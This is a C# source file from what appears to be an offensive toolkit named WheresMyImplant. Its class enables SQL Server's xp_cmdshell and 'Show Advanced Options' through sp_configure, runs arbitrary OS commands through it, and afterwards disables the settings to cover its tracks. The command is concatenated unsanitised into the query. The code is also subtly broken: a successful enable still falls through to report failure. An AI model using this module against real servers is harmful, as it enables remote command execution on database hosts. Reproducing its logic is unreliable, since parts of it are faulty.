using System;
using System.Collections.ObjectModel;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;


using System.Reflection;

namespace WheresMyImplant
{
    class RunXPCmdShell : BaseSQL, IDisposable
    {
        private Boolean sp_configure_advanced = false;
        private Boolean sp_configure_cmdshell = false;

        internal RunXPCmdShell(String server, String database, String username, String password) : base(server, database, username, password)
        {
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean EnableXPCmdShell()
        {
            
            Console.WriteLine("[*] Testing if xp_cmdshell is enabled");
            if ("0" != ExecuteQuery("sp_configure 'xp_cmdshell'").TrimEnd())
            {
                Console.WriteLine("[+] xp_cmdshell is enabled");
                return true;
            }

            Console.WriteLine("[-] xp_cmdshell is disabled");
            Console.WriteLine("[*] Attempting to enable");
            if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'").TrimEnd())
            {
                Console.WriteLine("[-] Show Advanced Options is disabled");

                Console.WriteLine("[*] Attempting to enable Show Advanced Options");
                ExecuteQuery("sp_configure 'Show Advanced Options',1;RECONFIGURE");
                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
                {
                    Console.WriteLine("[-] Enabling Show Advanced Options failed");
                    return false;
                }
                Console.WriteLine("[+] Enabling Show Advanced Options succeeded");
                sp_configure_advanced = true;
            }

            Console.WriteLine("[*] Attempting to enable xp_cmdshell");
            if ("0" != ExecuteQuery("sp_configure 'xp_cmdshell',1;RECONFIGURE").TrimEnd())
            {
                Console.WriteLine("[+] Enabling xp_cmdshell succeeded");
                sp_configure_cmdshell = true;
            }
            Console.WriteLine("[-] Enabling xp_cmdshell failed");
            return false;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        internal void Execute(String command)
        {
            Console.WriteLine("[*] Executing query");
            Console.WriteLine(ExecuteQuery("EXEC master..xp_cmdshell '" + command + "'").TrimEnd());
            Console.WriteLine("[+] Query completed");
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        { 
            if (sp_configure_cmdshell)
            {
                Console.WriteLine("[*] Attempting to disable xp_cmdshell");
                ExecuteQuery("sp_configure 'xp_cmdshell',0;RECONFIGURE");
                if ("0" == ExecuteQuery("sp_configure 'xp_cmdshell'"))
                {
                    Console.WriteLine("[+] Disabling xp_cmdshell succeeded");
                }
                else
                {
                    Console.WriteLine("[-] Disabling xp_cmdshell failed");
                    Console.WriteLine("[-] sp_configure 'xp_cmdshell',0;RECONFIGURE");
                }
            }
            
            if (sp_configure_advanced)
            {
                Console.WriteLine("[*] Attempting to disable xp_cmdshell");
                ExecuteQuery("sp_configure 'Show Advanced Options',0;RECONFIGURE");
                if ("0" == ExecuteQuery("sp_configure 'Show Advanced Options'"))
                {
                    Console.WriteLine("[+] Disabling Show Advanced Options succeeded");
                }
                else
                {
                    Console.WriteLine("[-] Disabling Show Advanced Options failed");
                    Console.WriteLine("[-] sp_configure 'Show Advanced Options',0;RECONFIGURE");
                }
            }
        }
    }
}
